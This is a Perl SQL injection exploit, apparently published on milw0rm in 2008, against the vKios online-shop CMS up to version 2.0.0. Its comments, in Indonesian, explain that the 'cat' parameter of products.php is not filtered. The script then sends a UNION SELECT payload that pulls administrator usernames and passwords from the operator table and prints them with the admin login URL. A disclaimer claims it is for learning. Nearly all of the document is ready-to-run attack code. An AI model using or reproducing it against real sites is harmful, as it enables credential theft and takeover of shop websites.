<html><head><title>vKios <= 2.0.0 (products.php cat) Remote SQL Injection Exploit</title></head><pre>#!/usr/bin/perl
#
# Indonesian Newhack Security Advisory
# ------------------------------------
# vKios &lt;= 2.0.0  (products.php cat) Remote SQL Injection Exploit
# Waktu		:  Feb 8 2008 10:00PM
# Software	:  vKios  
# Versi		:  &lt;= 2.0.0
# Vendor 	:  http://www.vkios.com/
#
# ------------------------------------
# Audit Oleh 	:  NTOS-Team
# Lokasi	:  Indonesia | http://newhack.org
# Penjelasan	:
# 
# vKios adalah aplikasi CMS untuk membangun website toko online dalam sekejap
# variabel &quot;cat&quot; pada berkas &quot;products.php&quot; tidak tersaring dengan sempurna
# sehingga pengunjung site dapat memanipulasi pernyataan SQL melalui URL secara Remote
# Contoh ;
# http://site.korban/products.php?cat=[SQLI]   
#
# -------------------------------------
# Exploit ini dibuat untuk pembelajaran, pengetesan dan pembuktian dari apa yang kami pelajari,
# Indonesian Newhack Technology tidak bertanggung jawab akan kerusakan 
# yang diakibatkan dari penyalahgunaan exploit oleh pihak lain  
#
# =&gt; NTOS-Team-&gt;[fl3xu5,k1tk4t,opt1lc]
# 
use LWP::UserAgent;
use Getopt::Long;

if(!$ARGV[2])
{
 print &quot;\n  |-------------------------------------------------------|&quot;;
 print &quot;\n  |            Indonesian Newhack Technology              |&quot;;
 print &quot;\n  |-------------------------------------------------------|&quot;;
 print &quot;\n  | vKios (products.php cat) Remote SQL Injection Exploit |&quot;;
 print &quot;\n  |                Coded by NTOS-Team                     |&quot;;
 print &quot;\n  |-------------------------------------------------------|&quot;;
 print &quot;\n[!] &quot;;
 print &quot;\n[!] Penggunaan : perl vkios.pl [Site] [Path] [Option]&quot;;
 print &quot;\n[!] [Option] 2 = versi &gt; 1.3  |  1 = versi &lt; 1.3 &quot;;
 print &quot;\n[!] Contoh     : perl vkios.pl localhost /vkios/ -o 1&quot;;
 print &quot;\n[!] &quot;;
 print &quot;\n&quot;;
 exit;
}
$site = $ARGV[0]; # Site Target
$path = $ARGV[1]; # Path direktori vKios
%options = ();
GetOptions(\%options, &quot;o=i&quot;,);
if($options{&quot;o&quot;} &amp;&amp; $options{&quot;o&quot;} == 1) { $injek = &quot;http://&quot;.$site.$path.&quot;products.php?cat=-1%20union%20select%201,concat(0x74346d7520,username,0x3a,password,0x2067656c3470),3,4,5,6,7,8,9%20from%20operator&quot;; }
if($options{&quot;o&quot;} &amp;&amp; $options{&quot;o&quot;} == 2) { $injek = &quot;http://&quot;.$site.$path.&quot;products.php?cat=-1%20union%20select%201,concat(0x74346d7520,username,0x3a,password,0x2067656c3470),3,4,5,6,7,8,9,10%20from%20operator&quot;; }

$www = new LWP::UserAgent;
$sql = $injek;
print &quot;\n\n [Konek] Injeksi SQL \n&quot;;
$res = $www -&gt; get($sql) or err();
$res -&gt; content() =~ /t4mu (.*?) gel4p/ or err();
print &quot;\n [Info.] username:password&quot;;
print &quot;\n [Hasil] $1 \n&quot;;
print &quot;\n [Login] http://&quot;.$site.$path.&quot;admin/ \n\n&quot;;

sub err()
{
print &quot;\n [-] Exploit gagal :( - cari yang lain!&quot;;
exit();
}

# milw0rm.com [2008-02-12]</pre></html>